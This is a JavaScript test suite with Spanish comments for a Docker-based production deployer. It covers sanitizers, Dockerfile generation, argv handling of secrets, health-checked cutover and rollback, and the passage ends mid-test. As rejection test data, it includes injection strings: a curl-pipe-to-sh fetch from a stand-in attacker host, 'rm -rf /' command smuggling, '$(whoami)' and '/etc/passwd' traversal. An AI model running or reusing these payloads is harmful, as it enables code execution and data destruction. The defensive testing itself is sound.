const assert = require('assert');
const fs = require('fs');
const http = require('http');
const os = require('os');
const path = require('path');

const deployManagerSingleton = require('../server/services/deployManager');
const { DeployManager, helpers } = require('../server/services/deployManager');
const { PreviewManager } = require('../server/services/previewManager');
const repoSync = require('../server/services/repoSync');
const caddyManager = require('../server/services/caddyManager');

const { safeSlug, isValidEnvName, sanitizeHealthPath, sanitizeNodeMajor } = helpers;

/**
 * Pruebas del desplegador a producción.
 *
 * La mayor parte NO necesita Docker: la detección de stack, la generación del
 * Dockerfile, la construcción de los argv y —lo más importante— la máquina de
 * estados de promoción y rollback se prueban con el ejecutor de docker sustituido
 * por un doble. Solo el tramo final (construir e2e una imagen de verdad) exige un
 * daemon, y si no lo hay se salta igual que hace `tests/caddy.test.js`.
 *
 * Una instancia nueva de DeployManager con `saveStore` anulado no toca el disco,
 * así que las pruebas no ensucian data/deployments.json.
 */

let tmpRoot = null;

function fixture(name, files) {
  const dir = path.join(tmpRoot, name);
  for (const [relative, content] of Object.entries(files)) {
    const target = path.join(dir, relative);
    fs.mkdirSync(path.dirname(target), { recursive: true });
    fs.writeFileSync(target, content, 'utf8');
  }
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

/** Instancia aislada: sin disco y sin daemon. */
function sandbox() {
  const dm = new DeployManager();
  dm.store = {};
  dm.saveStore = () => {};
  dm.notify = () => {};
  // Sin esto cada prueba tardaría lo que tarda `docker --version` en fallar.
  dm.hasBinary = async () => false;
  dm.detectDocker = async () => ({ available: true, version: 'prueba', reason: null });
  return dm;
}

async function testDeploy() {
  console.log('🧪 Probando el desplegador a producción (deployManager)...');

  tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-deploy-'));

  try {
    await testSanitizers();
    await testStrategyDetection();
    await testDockerfileGeneration();
    await testModernStacksSsrAndMonorepo();
    await testBuildArgvDiscipline();
    await testBuildKitSecretsAndRunBuild();
    await testRunArgvSecrets();
    await testWaitForHealthRealHttp();
    await testRouteSpecCompatibility();
    await testCutoverOrdering();
    await testFailedHealthLeavesOldVersionServing();
    await testCancelSemaphoreHooksAndPrune();
    await testRollback();
    await testBuildCacheGuardrails();
    await testRepoSyncAbortSignal();
    await testPreviewLifecycleAbortSupersedeAndEnv();
    await testRealDockerDeploy();
  } finally {
    try { fs.rmSync(tmpRoot, { recursive: true, force: true }); } catch (e) {}
  }

  console.log('✅ Desplegador a producción verificado\n');
}

// ---------------------------------------------------------------------------
// 1. Saneadores — la primera línea contra la inyección
// ---------------------------------------------------------------------------
async function testSanitizers() {
  assert.strictEqual(isValidEnvName('DATABASE_URL'), true);
  assert.strictEqual(isValidEnvName('_PRIVADO'), true);
  // Un nombre de variable SÍ viaja en argv: nada que parezca un flag pasa.
  assert.strictEqual(isValidEnvName('--privileged'), false);
  assert.strictEqual(isValidEnvName('-v'), false);
  assert.strictEqual(isValidEnvName('CON ESPACIO'), false);
  assert.strictEqual(isValidEnvName('1EMPIEZA_POR_DIGITO'), false);
  assert.strictEqual(isValidEnvName('CLAVE=VALOR'), false);

  assert.strictEqual(sanitizeHealthPath('/health'), '/health');
  assert.strictEqual(sanitizeHealthPath('/'), '/');
  assert.strictEqual(sanitizeHealthPath('/../../etc/passwd'), null);
  assert.strictEqual(sanitizeHealthPath('/x"; rm -rf /'), null);
  assert.strictEqual(sanitizeHealthPath('/con espacio'), null);
  assert.strictEqual(sanitizeHealthPath('/$(whoami)'), null);

  // Esto acaba dentro de una línea FROM de un Dockerfile generado.
  assert.strictEqual(sanitizeNodeMajor('>=22'), '22');
  assert.strictEqual(sanitizeNodeMajor('22.3.1'), '22');
  assert.strictEqual(sanitizeNodeMajor('alpine'), null);
  assert.strictEqual(sanitizeNodeMajor('999'), null);

  assert.strictEqual(safeSlug('proj_1789_ABC'), 'proj_1789_abc');
  assert.strictEqual(safeSlug('../../etc/passwd'), 'etc-passwd');
  assert.strictEqual(safeSlug(''), 'app');

  console.log('  ✓ Saneadores: nombres de variable, rutas de salud, versión de Node y slugs');
}

// ---------------------------------------------------------------------------
// 2. Detección de la estrategia de construcción
// ---------------------------------------------------------------------------
async function testStrategyDetection() {
  const dm = sandbox();

  const withDockerfile = fixture('con-dockerfile', {
    'Dockerfile': 'FROM node:22-alpine\nEXPOSE 7654\nCMD ["node", "index.js"]\n',
    'package.json': JSON.stringify({ name: 'x', dependencies: { next: '15.0.0' } })
  });
  const s1 = await dm.detectStrategy(withDockerfile, {});
  assert.strictEqual(s1.builder, 'dockerfile', 'Un Dockerfile del repositorio manda sobre la detección');
  assert.strictEqual(s1.containerPort, 7654, 'Debe leerse el EXPOSE del Dockerfile');
  assert.strictEqual(s1.injectHealthcheck, false, 'No se pisa el HEALTHCHECK de una imagen ajena');

  const nextApp = fixture('next-app', {
    'package.json': JSON.stringify({ dependencies: { next: '15.0.0' }, scripts: { build: 'next build', start: 'next start' } })
  });
  const s2 = await dm.detectStrategy(nextApp, {});
  assert.strictEqual(s2.builder, 'generated');
  assert.strictEqual(s2.stack, 'next');
  assert.strictEqual(s2.containerPort, 3000);

  const viteApp = fixture('vite-app', {
    'package.json': JSON.stringify({ devDependencies: { vite: '6.0.0' }, scripts: { build: 'vite build' } })
  });
  const s3 = await dm.detectStrategy(viteApp, {});
  assert.strictEqual(s3.stack, 'vite');
  assert.strictEqual(s3.containerPort, 80, 'Un SPA compilado se sirve por nginx en el 80');

  const nodeApp = fixture('node-app', {
    'package.json': JSON.stringify({ scripts: { start: 'node server.js' }, engines: { node: '>=20' } })
  });
  const s4 = await dm.detectStrategy(nodeApp, {});
  assert.strictEqual(s4.stack, 'node');
  assert.strictEqual(s4.nodeMajor, '20');

  const pyApp = fixture('py-app', { 'requirements.txt': 'flask\n', 'main.py': 'print(1)\n' });
  const s5 = await dm.detectStrategy(pyApp, {});
  assert.strictEqual(s5.stack, 'python');
  assert.strictEqual(s5.containerPort, 8000);

  const staticApp = fixture('static-app', { 'index.html': '<h1>hola</h1>' });
  const s6 = await dm.detectStrategy(staticApp, {});
  assert.strictEqual(s6.stack, 'static');

  const emptyApp = fixture('vacio', { 'LEEME.txt': 'nada' });
  const s7 = await dm.detectStrategy(emptyApp, {});
  assert.strictEqual(s7.stack, 'desconocido', 'Sin pistas, se dice que no se sabe en vez de adivinar');

  // El proyecto puede forzar puerto y ruta de salud.
  const s8 = await dm.detectStrategy(nodeApp, { containerPort: 4321, healthPath: '/salud' });
  assert.strictEqual(s8.containerPort, 4321);
  assert.strictEqual(s8.healthPath, '/salud');

  // Una ruta de salud maliciosa se descarta y se cae al valor por defecto.
  const s9 = await dm.detectStrategy(nodeApp, { healthPath: '/../../secreto' });
  assert.strictEqual(s9.healthPath, '/');

  console.log('  ✓ Detección: Dockerfile, Next, Vite, Node, Python, estático y «desconocido»');
}

// ---------------------------------------------------------------------------
// 3. Dockerfile generado
// ---------------------------------------------------------------------------
async function testDockerfileGeneration() {
  const dm = sandbox();

  const nodeDf = dm.generateDockerfile({ stack: 'node', containerPort: 3000, nodeMajor: '20', startCommand: 'start' });
  assert.ok(nodeDf.includes('FROM node:20-alpine'), 'Debe usar la versión de Node declarada');
  assert.ok(nodeDf.includes('USER culkibo'), 'No se ejecuta como root');
  assert.ok(nodeDf.includes('EXPOSE 3000'));
  assert.ok(nodeDf.includes('npm ci'), 'Con lockfile, npm ci: reproducible y más rápido');

  const viteDf = dm.generateDockerfile({ stack: 'vite', containerPort: 80, outputDir: 'dist' });
  assert.ok(viteDf.includes('FROM nginx:1.27-alpine'));
  assert.ok(viteDf.includes('try_files $uri $uri/ /index.html'), 'Un SPA necesita fallback a index.html');
  assert.ok(viteDf.includes('COPY --from=build /app/dist'));

  const pyDf = dm.generateDockerfile({ stack: 'python', containerPort: 8000, pythonEntry: 'app.py' });
  assert.ok(pyDf.includes('CMD ["python", "app.py"]'));

  // --- Inyección por package.json --------------------------------------
  // `engines.node` sale de un repositorio ajeno y se escribe en una línea FROM.
  const evil = dm.generateDockerfile({
    stack: 'node',
    containerPort: 3000,
    nodeMajor: sanitizeNodeMajor('22-alpine\nRUN curl http://atacante.example/x | sh'),
    startCommand: 'start'
  });
  assert.ok(!evil.includes('atacante.example'), 'La versión de Node no puede inyectar instrucciones');
  assert.ok(!evil.includes('curl'), 'Ninguna instrucción extra puede colarse en el Dockerfile');
  assert.ok(evil.includes('FROM node:22-alpine'), 'Se queda solo con el entero saneado');

  // Lo mismo con el directorio de salida y el entrypoint de Python.
  const evilOut = dm.generateDockerfile({ stack: 'vite', containerPort: 80, outputDir: '../../../etc' });
  assert.ok(!evilOut.includes('../../../etc'), 'El directorio de salida se descarta si no es un nombre simple');
  const evilPy = dm.generateDockerfile({ stack: 'python', containerPort: 8000, pythonEntry: 'x.py; rm -rf /' });
  assert.ok(evilPy.includes('CMD ["python", "main.py"]'), 'Un entrypoint sospechoso cae al valor por defecto');

  // El healthcheck solo se inyecta en imágenes propias, y sin metacaracteres.
  const cmd = dm.healthCommandFor({ stack: 'node', containerPort: 3000, healthPath: '/' });
  assert.ok(cmd.includes('http://127.0.0.1:3000/'));
  assert.ok(!/[;&|`$]/.test(cmd.replace(/\$\{?[a-z]/gi, '')), 'Sin metacaracteres de shell en el health-cmd');

  console.log('  ✓ Dockerfile generado: multi-etapa, usuario sin privilegios y a prueba de inyección');
}

// ---------------------------------------------------------------------------
// 4. Disciplina de caché de construcción — la regresión de Coolify #7040
// ---------------------------------------------------------------------------
async function testBuildArgvDiscipline() {
  const dm = sandbox();
  const input = { imageTag: 'culkibo/demo:b1', contextDir: '/srv/demo', dockerfile: 'Dockerfile' };

  const first = dm.buildArgs(input);
  await new Promise(r => setTimeout(r, 15));
  const second = dm.buildArgs(input);

  // ESTA es la prueba que impide repetir el fallo #7040 de Coolify: inyectar un
  // build arg que cambia en cada ejecución (una marca de tiempo, un nonce) hace
  // fallar la caché desde su primer uso y multiplica el tiempo de build por
  // cuatro. Si alguien añade uno, estas dos llamadas dejan de coincidir.
  assert.deepStrictEqual(first, second, 'buildArgs debe ser determinista: ningún argumento puede cambiar entre builds');

  const joined = first.join(' ');
  assert.ok(!/--build-arg/.test(joined), 'Culkibo no inyecta NINGÚN build arg por su cuenta');
  assert.ok(!/CACHEBUST|BUILD_ID|SOURCE_COMMIT|\d{13}/.test(joined), 'Ni marcas de tiempo ni nonces en los argumentos de build');
  assert.ok(first.includes('--progress=plain'), 'Salida en texto plano para poder transmitirla línea a línea');
  assert.strictEqual(first[first.length - 1], '/srv/demo', 'El contexto va al final');

  // Los build args del usuario se pasan POR NOMBRE, nunca con su valor.
  const withArgs = dm.buildArgs({ ...input, buildArgNames: ['NPM_TOKEN', '--privileged', 'API_URL'] });
  assert.ok(withArgs.includes('NPM_TOKEN'));
  assert.ok(withArgs.includes('API_URL'));
  assert.ok(!withArgs.includes('--privileged'), 'Un nombre que parece un flag se descarta');
  assert.ok(!withArgs.some(a => a.includes('=') && a.startsWith('NPM_TOKEN')), 'Nunca NOMBRE=valor');

  // Los constructores externos: argv documentado y sin secretos en railpack.
  const rp = dm.externalBuilderArgs('railpack', { imageTag: 'culkibo/demo:b1', contextDir: '/srv/demo', envNames: ['SECRETO'] });
  assert.deepStrictEqual(rp, ['build', '/srv/demo', '--name', 'culkibo/demo:b1', '--progress', 'plain']);
  assert.ok(!rp.includes('--env'), 'Railpack solo acepta CLAVE=VALOR, así que no recibe ninguna variable');

  const np = dm.externalBuilderArgs('nixpacks', { imageTag: 'culkibo/demo:b1', contextDir: '/srv/demo', envNames: ['SECRETO', 'mal nombre'] });
  assert.deepStrictEqual(np, ['build', '/srv/demo', '--name', 'culkibo/demo:b1', '--env', 'SECRETO']);
  assert.ok(!np.some(a => a.includes('=')), 'Nixpacks admite `--env NOMBRE`: el valor lo toma del entorno');

  console.log('  ✓ Caché de construcción: argv determinista, cero build args inyectados (regresión #7040)');
}

// ---------------------------------------------------------------------------
// 5. Los secretos no pasan por argv
// ---------------------------------------------------------------------------
async function testRunArgvSecrets() {
  const dm = sandbox();
  const args = dm.runArgs({
    containerName: 'culkibo_demo_b1',
    imageTag: 'culkibo/demo:b1',
    hostPort: 40123,
    containerPort: 3000,
    envNames: ['DATABASE_URL', 'STRIPE_SECRET_KEY', '--privileged', 'MAL NOMBRE'],
    healthCmd: 'node -e "fetch(\'http://127.0.0.1:3000/\')"'
  });
  const joined = args.join(' ');

  // Los nombres viajan; los valores jamás. `ps` no puede ver un secreto.
  assert.ok(args.includes('DATABASE_URL'));
  assert.ok(args.includes('STRIPE_SECRET_KEY'));
  assert.ok(!joined.includes('DATABASE_URL='), 'Un valor de entorno nunca aparece en argv');
  assert.ok(!args.includes('--privileged'), 'Un nombre de variable inválido se descarta antes de llegar a argv');
  assert.ok(!args.includes('MAL NOMBRE'));

  // Servicio de producción, no un proceso que casualmente está vivo.
  assert.ok(joined.includes('--restart unless-stopped'), 'Política de reinicio obligatoria');
  assert.ok(joined.includes('--memory 1024m'));
  assert.ok(joined.includes('--memory-swap 1024m'), 'Swap desactivado: OOM rápido y visible');
  assert.ok(joined.includes('--cpus 1.0'));
  assert.ok(joined.includes('--pids-limit'));
  assert.ok(joined.includes('--security-opt no-new-privileges'));
  assert.ok(joined.includes('--log-opt max-size=10m'), 'Los logs del contenedor no pueden llenar el disco');
  assert.ok(joined.includes('--health-cmd'));

  // El contenedor solo es alcanzable por el proxy y por la sonda del daemon.
  assert.ok(args.includes('127.0.0.1:40123:3000'), 'Se publica solo en loopback, nunca en 0.0.0.0');
  assert.strictEqual(args[args.length - 1], 'culkibo/demo:b1', 'La imagen va al final');

  // Ningún argumento se construye concatenando: cada uno es un elemento suelto.
  assert.ok(args.every(a => typeof a === 'string'), 'argv es un array de cadenas, no una línea de shell');

  console.log('  ✓ docker run: secretos fuera de argv, límites, reinicio y publicación en loopback');
}

// ---------------------------------------------------------------------------
// 6. La ruta que se le pide a Caddy es válida
// ---------------------------------------------------------------------------
async function testRouteSpecCompatibility() {
  const dm = sandbox();
  const hostnames = dm.hostnamesFor({
    domains: ['App.Ejemplo.COM', 'app.ejemplo.com', '  otro.ejemplo.com ', 'no es un dominio', '']
  });
  assert.deepStrictEqual(hostnames, ['app.ejemplo.com', 'otro.ejemplo.com'], 'Normaliza, deduplica y descarta basura');

  // `buildRoute` es puro: valida la forma sin hablar con ningún Caddy.
  const route = caddyManager.buildRoute({
    projectId: 'proj_demo',
    hostnames,
    upstreams: ['culkibo_demo_b1:3000']
  });
  assert.strictEqual(route['@id'], 'culkibo_proj_demo');
  assert.strictEqual(route.handle[0].handler, 'reverse_proxy');
  assert.strictEqual(route.handle[0].upstreams[0].dial, 'culkibo_demo_b1:3000');
  assert.strictEqual(route.terminal, true, 'Un proyecto no puede recibir tráfico de otro');
  assert.ok(route.handle[0].stream_close_delay > 0, 'El streaming sobrevive a la recarga de configuración');

  console.log('  ✓ La especificación de ruta es la que Caddy acepta (@id, terminal, stream_close_delay)');
}

// ---------------------------------------------------------------------------
// 7. Orden de la conmutación — construir, arrancar, VERIFICAR, conmutar, drenar
// ---------------------------------------------------------------------------
async function testCutoverOrdering() {
  const dm = sandbox();
  const trace = [];
  const contextDir = fixture('cutover', { 'index.html': '<h1>v2</h1>' });

  dm.detectStrategy = async () => ({
    builder: 'dockerfile', stack: 'dockerfile', dockerfile: 'Dockerfile',
    containerPort: 3000, healthPath: '/', injectHealthcheck: false, reason: 'prueba'
  });
  dm.runBuild = async () => { trace.push('construir'); return { ok: true }; };
  dm.ensureNetwork = async () => true;
  dm.findFreePort = async () => 45001;
  dm.resolveUpstream = async ({ containerName, containerPort }) => ({ dial: `${containerName}:${containerPort}`, mode: 'network' });
  dm.waitForHealth = async () => { trace.push('verificar'); return { healthy: true, attempts: 1, status: 200 }; };
  dm.switchRoute = async (dep) => { trace.push('conmutar'); dep.routeSwitched = true; return { ok: true }; };
  dm.runDocker = async (args) => {
    if (args[0] === 'run') trace.push('arrancar');
    if (args[0] === 'stop') trace.push('detener-viejo');
    if (args[0] === 'ps') return { code: 0, stdout: '', stderr: '' };
    return { code: 0, stdout: '', stderr: '' };
  };

  // Ya hay una versión sirviendo: es el caso que importa.
  dm.store['proj_orden'] = {
    current: {
      deploymentId: 'dep_viejo', imageTag: 'culkibo/orden:b0', containerName: 'culkibo_orden_b0',
      hostPort: 45000, containerPort: 3000, upstream: 'culkibo_orden_b0:3000',
      hostnames: ['orden.ejemplo.com'], healthPath: '/', version: 'b0'
    },
    previous: null,
    history: []
  };

  const project = { id: 'proj_orden', name: 'Orden', domains: ['orden.ejemplo.com'], envVars: {} };
  const result = await dm.deploy(project, { contextDir, drainTimeoutMs: 5, stopGraceSeconds: 0 });
  await dm.awaitDrain('proj_orden');

  assert.strictEqual(result.status, 'activo', `El despliegue debía terminar activo, fue ${result.status}: ${result.error}`);
  assert.deepStrictEqual(
    trace,
    ['construir', 'arrancar', 'verificar', 'conmutar', 'detener-viejo'],
    'El orden es innegociable: el viejo solo se detiene DESPUÉS de conmutar y drenar'
  );

  // El viejo pasa a ser el ancla de rollback; no se ha borrado.
  assert.strictEqual(dm.store['proj_orden'].current.containerName, result.containerName);
  assert.strictEqual(dm.store['proj_orden'].previous.containerName, 'culkibo_orden_b0');
  assert.ok(dm.store['proj_orden'].current.upstream.endsWith(':3000'));

  // Tiempos de fase en vivo registrados en deployment.phaseTimings
  assert.ok(result.phaseTimings && typeof result.phaseTimings === 'object', 'Debe registrar phaseTimings por fase');
  for (const phase of ['construyendo', 'arrancando', 'verificando', 'promocionando']) {
    assert.ok(result.phaseTimings[phase], `Falta phaseTimings.${phase}`);
    assert.strictEqual(typeof result.phaseTimings[phase].durationMs, 'number');
    assert.ok(result.phaseTimings[phase].durationMs >= 0);
    assert.ok(result.phaseTimings[phase].startedAt && result.phaseTimings[phase].finishedAt);
  }

  console.log('  ✓ Conmutación: construir → arrancar → verificar → conmutar → drenar → detener (+ phaseTimings)');
}

// ---------------------------------------------------------------------------
// 8. Si la versión nueva no está sana, NO se toca la ruta
//    (es el fallo #8627 de Coolify: 502/503 en actualizaciones rodantes)
// ---------------------------------------------------------------------------
async function testFailedHealthLeavesOldVersionServing() {
  const dm = sandbox();
  const contextDir = fixture('salud-fallida', { 'index.html': '<h1>roto</h1>' });
  let switchAttempted = false;
  const removed = [];

  dm.detectStrategy = async () => ({
    builder: 'dockerfile', stack: 'dockerfile', dockerfile: 'Dockerfile',
    containerPort: 3000, healthPath: '/', injectHealthcheck: false, reason: 'prueba'
  });
  dm.runBuild = async () => ({ ok: true });
  dm.ensureNetwork = async () => true;
  dm.findFreePort = async () => 45002;
  dm.waitForHealth = async () => ({ healthy: false, attempts: 30, reason: 'no respondió en 30 s' });
  dm.switchRoute = async () => { switchAttempted = true; return { ok: true }; };
  dm.runDocker = async (args) => {
    if (args[0] === 'rm') removed.push(args[args.length - 1]);
    return { code: 0, stdout: '', stderr: '' };
  };

  const serving = {
    deploymentId: 'dep_bueno', imageTag: 'culkibo/roto:b0', containerName: 'culkibo_roto_b0',
    hostPort: 45000, containerPort: 3000, upstream: 'culkibo_roto_b0:3000',
    hostnames: ['roto.ejemplo.com'], healthPath: '/', version: 'b0'
  };
  dm.store['proj_roto'] = { current: serving, previous: null, history: [] };

  const project = { id: 'proj_roto', name: 'Roto', domains: ['roto.ejemplo.com'], envVars: {} };
  const result = await dm.deploy(project, { contextDir });

  assert.strictEqual(result.status, 'fallido');
  assert.strictEqual(result.routeSwitched, false);
  assert.strictEqual(switchAttempted, false, 'Jamás se conmuta la ruta hacia algo que no ha respondido');
  assert.strictEqual(dm.store['proj_roto'].current, serving, 'La versión que funcionaba sigue siendo la actual');
  assert.ok(removed.includes(result.containerName), 'El contenedor fallido se retira, no se queda huérfano');

  console.log('  ✓ Salud fallida: la ruta no se toca y la versión anterior sigue sirviendo (evita #8627)');
}

// ---------------------------------------------------------------------------
// 9. Rollback
// ---------------------------------------------------------------------------
async function testRollback() {
  const previous = {
    deploymentId: 'dep_1', imageTag: 'culkibo/rb:b1', containerName: 'culkibo_rb_b1',
    hostPort: 45010, containerPort: 3000, upstream: 'culkibo_rb_b1:3000',
    hostnames: ['rb.ejemplo.com'], healthPath: '/', version: 'b1'
  };
  const current = {
    deploymentId: 'dep_2', imageTag: 'culkibo/rb:b2', containerName: 'culkibo_rb_b2',
    hostPort: 45011, containerPort: 3000, upstream: 'culkibo_rb_b2:3000',
    hostnames: ['rb.ejemplo.com'], healthPath: '/', version: 'b2'
  };

  // --- Sin versión anterior no hay nada que revertir ----------------------
  const empty = sandbox();
  empty.store['proj_vacio'] = { current, previous: null, history: [] };
  await assert.rejects(
    () => empty.rollback('proj_vacio'),
    /No hay ninguna versión anterior/,
    'Revertir sin ancla debe fallar con un mensaje claro, no silenciosamente'
  );

  // --- Camino rápido: el viejo sigue vivo dentro de su ventana de drenaje --
  const fast = sandbox();
  const fastCalls = [];
  fast.store['proj_rb'] = { current: { ...current }, previous: { ...previous }, history: [] };
  fast.switchRoute = async (rec, hosts, dial) => { fastCalls.push(`conmutar:${dial}`); rec.routeSwitched = true; return { ok: true }; };
  fast.runDocker = async (args) => {
    fastCalls.push(args[0]);
    if (args[0] === 'inspect') return { code: 0, stdout: 'true\n', stderr: '' };
    return { code: 0, stdout: '', stderr: '' };
  };

  const fastResult = await fast.rollback('proj_rb', { drainTimeoutMs: 5, stopGraceSeconds: 0 });
  await fast.awaitDrain('proj_rb');

  assert.strictEqual(fastResult.status, 'activo');
  assert.ok(!fastCalls.includes('start'), 'Si el viejo sigue vivo, revertir es SOLO un cambio de ruta');
  assert.ok(fastCalls.includes('conmutar:culkibo_rb_b1:3000'), 'La ruta vuelve al destino anterior');
  assert.strictEqual(fast.store['proj_rb'].current.containerName, 'culkibo_rb_b1');
  assert.strictEqual(fast.store['proj_rb'].previous.containerName, 'culkibo_rb_b2', 'Se intercambian: un segundo rollback vuelve hacia delante');

  // --- Camino lento: el viejo está parado -> arrancar, VERIFICAR, conmutar -
  const slow = sandbox();
  const slowTrace = [];
  slow.store['proj_rb2'] = { current: { ...current }, previous: { ...previous }, history: [] };
  slow.waitForHealth = async () => { slowTrace.push('verificar'); return { healthy: true, attempts: 2, status: 200 }; };
  slow.switchRoute = async (rec) => { slowTrace.push('conmutar'); rec.routeSwitched = true; return { ok: true }; };
  slow.runDocker = async (args) => {
    if (args[0] === 'inspect') return { code: 0, stdout: 'false\n', stderr: '' };
    if (args[0] === 'start') slowTrace.push('arrancar');
    return { code: 0, stdout: '', stderr: '' };
  };
  const slowResult = await slow.rollback('proj_rb2', { drainTimeoutMs: 5, stopGraceSeconds: 0 });
  await slow.awaitDrain('proj_rb2');

  assert.strictEqual(slowResult.status, 'activo');
  assert.deepStrictEqual(slowTrace, ['arrancar', 'verificar', 'conmutar'], 'Nunca se conmuta hacia algo que aún no responde');

  // --- Si la versión anterior tampoco arranca sana, no se conmuta ---------
  const broken = sandbox();
  let brokenSwitched = false;
  broken.store['proj_rb3'] = { current: { ...current }, previous: { ...previous }, history: [] };
  broken.waitForHealth = async () => ({ healthy: false, attempts: 30, reason: 'tampoco responde' });
  broken.switchRoute = async () => { brokenSwitched = true; return { ok: true }; };
  broken.runDocker = async (args) => {
    if (args[0] === 'inspect') return { code: 0, stdout: 'false\n', stderr: '' };
    return { code: 0, stdout: '', stderr: '' };
  };
  const brokenResult = await broken.rollback('proj_rb3', { drainTimeoutMs: 5 });
  assert.strictEqual(brokenResult.status, 'fallido');
  assert.strictEqual(brokenSwitched, false, 'Cambiar una versión mala por un 502 no es un rollback');
  assert.strictEqual(broken.store['proj_rb3'].current.containerName, 'culkibo_rb_b2', 'El estado no se toca si el rollback falla');

  // --- Si el contenedor anterior ya no existe, se dice ---------------------
  const gone = sandbox();
  gone.store['proj_rb4'] = { current: { ...current }, previous: { ...previous }, history: [] };
  gone.runDocker = async () => ({ code: 1, stdout: '', stderr: 'No such object' });
  const goneResult = await gone.rollback('proj_rb4');
  assert.strictEqual(goneResult.status, 'fallido');
  assert.ok(/ya no existe/.test(goneResult.error));

  console.log('  ✓ Rollback: camino rápido por ruta, camino lento con verificación, y fallos honestos');
}

// ---------------------------------------------------------------------------
// 10. Poda de la caché de BuildKit
// ---------------------------------------------------------------------------
async function testBuildCacheGuardrails() {
  const dm = sandbox();
  let received = null;
  dm.runDocker = async (args) => { received = args; return { code: 0, stdout: 'Total reclaimed space: 1.2GB', stderr: '' }; };

  const ok = await dm.pruneBuildCache({ keepStorageGb: 10 });
  assert.strictEqual(ok.ok, true);
  assert.deepStrictEqual(received, ['builder', 'prune', '--force', '--keep-storage', '10GB']);

  await dm.pruneBuildCache({ keepStorageGb: 5, untilHours: 72 });
  assert.ok(received.includes('--filter'));
  assert.ok(received.includes('until=72h'));

  // Nada de números que vengan del cuerpo de una petición sin validar.
  assert.strictEqual((await dm.pruneBuildCache({ keepStorageGb: 'diez' })).ok, false);
  assert.strictEqual((await dm.pruneBuildCache({ keepStorageGb: -1 })).ok, false);
  assert.strictEqual((await dm.pruneBuildCache({ keepStorageGb: 1, untilHours: 'ayer' })).ok, false);

  // Guardia de concurrencia: no podar mientras hay construcciones activas (carrera Coolify/Dokploy)
  dm._activeBuilds = 1;
  let prunedWhileBusy = false;
  dm.runDocker = async (args) => { prunedWhileBusy = true; received = args; return { code: 0, stdout: 'ok', stderr: '' }; };
  const busyRes = await dm.pruneBuildCache({ keepStorageGb: 10 });
  assert.strictEqual(busyRes.ok, false);
  assert.strictEqual(busyRes.busy, true);
  assert.strictEqual(busyRes.activeBuilds, 1);
  assert.strictEqual(prunedWhileBusy, false, 'No debe invocar docker builder prune si _activeBuilds > 0');
  const forcedRes = await dm.pruneBuildCache({ keepStorageGb: 10, force: true });
  assert.strictEqual(forcedRes.ok, true);
  assert.strictEqual(prunedWhileBusy, true);
  dm._activeBuilds = 0;

  // La poda es MANUAL: ningún camino del despliegue la llama sola, porque eso
  // es destruirse la caché (Coolify #7040 por otra vía).
  const source = fs.readFileSync(path.join(__dirname, '..', 'server', 'services', 'deployManager.js'), 'utf8');
  const callSites = (source.match(/pruneBuildCache\(/g) || []).length;
  assert.strictEqual(callSites, 1, 'pruneBuildCache solo debe estar definida, nunca invocada desde el despliegue');

  console.log('  ✓ Poda de caché: argv correcto, entradas validadas, guardia _activeBuilds y nunca automática');
}

// ---------------------------------------------------------------------------
// 3b. Stacks modernos (Rust, Deno, uv/Poetry/Django, PHP/Laravel, Elixir, Java),
//     Bun standalone/healthcheck, SSR (Nuxt/SvelteKit/Astro) y Monorepos
// ---------------------------------------------------------------------------
async function testModernStacksSsrAndMonorepo() {
  const dm = sandbox();

  // Bun + Next standalone: usa `bun` en CMD y `healthCommandFor` (nunca `node`, ausente en oven/bun:1-alpine)
  const bunNextDir = fixture('bun-next', {
    'package.json': JSON.stringify({
      name: 'bun-next',
      packageManager: 'bun@1.2.0',
      dependencies: { next: '15.0.0', react: '19.0.0' },
      scripts: { build: 'next build', start: 'next start' }
    }),
    'bun.lock': '',
    'next.config.mjs': 'export default { output: "standalone" };\n'
  });
  const sBun = await dm.detectStrategy(bunNextDir, {});
  assert.strictEqual(sBun.stack, 'next');
  assert.strictEqual(sBun.packageManager, 'bun');
  assert.strictEqual(sBun.nextOutput, 'standalone');
  const dfBun = dm.generateDockerfile(sBun);
  assert.ok(dfBun.includes('FROM oven/bun:1-alpine'), 'Bun debe usar oven/bun:1-alpine');
  assert.ok(dfBun.includes('CMD ["bun", "server.js"]'), 'Next standalone sobre Bun debe arrancar con bun, no node');
  assert.ok(!dfBun.includes('CMD ["node", "server.js"]'));
  const bunHealth = dm.healthCommandFor(sBun);
  assert.ok(bunHealth.startsWith('bun -e '), `healthCommandFor sobre Bun debe usar bun, obtuvo: ${bunHealth}`);

  // Nuxt SSR standalone
  const nuxtDir = fixture('nuxt-app', {
    'package.json': JSON.stringify({ name: 'nuxt-demo', dependencies: { nuxt: '3.15.0' }, scripts: { build: 'nuxt build' } })
  });
  const sNuxt = await dm.detectStrategy(nuxtDir, {});
  assert.strictEqual(sNuxt.stack, 'nuxt');
  const dfNuxt = dm.generateDockerfile(sNuxt);
  assert.ok(dfNuxt.includes('.output/server/index.mjs') && dfNuxt.includes('NITRO_HOST=0.0.0.0') && dfNuxt.includes('USER culkibo'));

  // SvelteKit SSR vs SvelteKit static adapter
  const skSsrDir = fixture('sk-ssr', {
    'package.json': JSON.stringify({
      name: 'sk-ssr',
      devDependencies: { '@sveltejs/kit': '2.15.0', '@sveltejs/adapter-node': '5.2.0' },
      scripts: { build: 'vite build' }
    })
  });
  const sSkSsr = await dm.detectStrategy(skSsrDir, {});
  assert.strictEqual(sSkSsr.stack, 'sveltekit');
  const dfSkSsr = dm.generateDockerfile(sSkSsr);
  assert.ok(dfSkSsr.includes('CMD ["node", "build/index.js"]') && dfSkSsr.includes('HOST=0.0.0.0'));

  const skStaticDir = fixture('sk-static', {
    'package.json': JSON.stringify({
      name: 'sk-static',
      devDependencies: { '@sveltejs/kit': '2.15.0', '@sveltejs/adapter-static': '3.0.0' },
      scripts: { build: 'vite build' }
    })
  });
  const sSkStatic = await dm.detectStrategy(skStaticDir, {});
  assert.strictEqual(sSkStatic.stack, 'vite');
  assert.strictEqual(sSkStatic.outputDir, 'build');

  // Astro SSR vs Astro static
  const astroSsrDir = fixture('astro-ssr', {
    'package.json': JSON.stringify({
      name: 'astro-ssr',
      dependencies: { astro: '5.1.0', '@astrojs/node': '9.0.0' },
      scripts: { build: 'astro build' }
    })
  });
  const sAstroSsr = await dm.detectStrategy(astroSsrDir, {});
  assert.strictEqual(sAstroSsr.stack, 'astro-ssr');
  assert.strictEqual(sAstroSsr.containerPort, 4321);
  const dfAstroSsr = dm.generateDockerfile(sAstroSsr);
